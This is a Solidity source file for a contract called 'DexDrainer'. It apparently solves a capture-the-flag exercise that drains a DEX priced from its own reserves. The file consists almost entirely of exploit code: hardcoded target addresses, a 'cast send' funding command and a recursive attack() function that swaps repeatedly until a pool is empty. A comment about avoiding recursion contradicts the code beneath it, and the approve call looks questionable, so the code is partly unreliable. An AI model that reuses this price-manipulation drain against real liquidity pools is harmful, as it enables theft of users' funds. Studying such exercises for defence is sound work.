// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

interface Dex {
    function swap(address from, address to, uint256 amount) external;
    function approve(address spender, uint256 amount) external;
    function balanceOf(address token, address account) external view returns (uint256);
    function getSwapPrice(address from, address to, uint256 amount) external view returns (uint256);
}
// cast send 0x1ECE78e7d69407EA8D59045e743b822311b58941 "transfer(address,uint256)" 0x8C683D3e434f6fD905cAbC8368A161634E4cbaE0 10 --private-key $PRIVATE_KEY --rpc-url $RPC_URL
contract DexDrainer { // 0x8C683D3e434f6fD905cAbC8368A161634E4cbaE0
    address public immutable token1 = 0x1ECE78e7d69407EA8D59045e743b822311b58941;
    address public immutable token2 = 0xB75EDBa5B471057b7765d222731930D110bb36a2;
    address public immutable dex = 0x771958E0b6d73783A62e3d82934ea01bcf315FE8;
    function getTokenToSwap() private view returns (address, address, uint256) {
        uint256 balanceOfToken1 = Dex(dex).balanceOf(token1, address(this));
        if (balanceOfToken1 > 0) {
            return (token1, token2, balanceOfToken1);
        } 
        uint256 balanceOfToken2 = Dex(dex).balanceOf(token2, address(this));
        if (balanceOfToken2 > 0) {
            return (token2, token1, balanceOfToken2);
        }
        return (address(0), address(0), 0);
    }
    function getExpectedAmount(uint256 amount, address from, address to) public view returns (uint256) {
        uint256 swapAmount = Dex(dex).getSwapPrice(from, to, amount);
        uint256 targetDexBalance = Dex(dex).balanceOf(to, dex);
        
        if (swapAmount <= targetDexBalance) {
            return amount;
        }
        // If the swap would require more than the DEX has, 
        // the exact amount needed is the DEX's entire source balance.
        return Dex(dex).balanceOf(from, dex);
    }

    function attack() public {
        (address from, address to, uint256 amount) = getTokenToSwap();
        uint256 expectedAmount = getExpectedAmount(amount, from, to);
        if (expectedAmount == 0) return;

        Dex(dex).approve(address(this), expectedAmount);
        Dex(dex).swap(from, to, expectedAmount);
        
        // Use a loop or check remaining balance rather than unbounded recursion to save gas
        if (Dex(dex).balanceOf(token1, dex) > 0 && Dex(dex).balanceOf(token2, dex) > 0) {
            attack();
        }
    }
}